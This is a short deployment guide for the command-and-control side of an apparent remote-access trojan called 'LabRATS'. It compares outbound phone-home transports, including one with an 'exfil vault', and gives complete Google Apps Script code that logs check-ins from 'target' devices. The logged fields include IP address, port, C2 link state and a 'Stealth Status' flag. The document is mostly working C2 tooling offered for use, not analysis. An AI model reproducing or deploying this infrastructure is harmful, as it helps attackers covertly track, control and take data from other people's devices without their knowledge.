# C2 deployment

Three transports. Pick by whether the target has routable IPv6.

| Transport | Reaches device when | Exfil vault | Fleet list |
| --- | --- | --- | --- |
| Direct IPv6 | target has a public GUA | no | no |
| Google Sheet | always (outbound only) | no | sheet rows |
| Node relay | always (outbound only) | yes | yes |

The Sheet and relay are **outbound-only**: the device phones home, so they work behind CGNAT and
NAT64. But you can only reach the dashboard through the relay's `/proxy/*` path — the device never
becomes directly reachable. Direct IPv6 is the only mode with real peer-to-peer latency.

## Option 1: Google Sheets

Logging only. Good for confirming a device is alive.

1. New [Google Sheet](https://docs.google.com/spreadsheets/u/0/).
2. Extensions → Apps Script. Paste:

```javascript
function doGet(e) { return handleRequest(e); }
function doPost(e) { return handleRequest(e); }

function handleRequest(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sheet = ss.getSheetByName("LabRATS Logs") || ss.insertSheet("LabRATS Logs");
    if (sheet.getLastRow() == 0) {
      sheet.appendRow(["Timestamp","Model #","Connection Type","IP Address","Port",
                       "Active C2 Link","Battery","Stealth Status","Power","Free Storage"]);
    }
    var data = (e.postData && e.postData.contents) ? JSON.parse(e.postData.contents) : e.parameter;
    sheet.appendRow([
      new Date(),
      data.device || data.model || "Unknown",
      data.network || "Unknown",
      data.ip || "Unknown",
      data.port || "9191",
      data.link || "Handshake_Pending",
      data.battery || "0%",
      (data.stealth === true || data.stealth === "true") ? "ACTIVE" : "OFF",
      data.charging || "Discharging",
      data.storage || "Unknown"
    ]);
    return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("ERROR: " + err.message).setMimeType(ContentService.MimeType.TEXT);
  }
}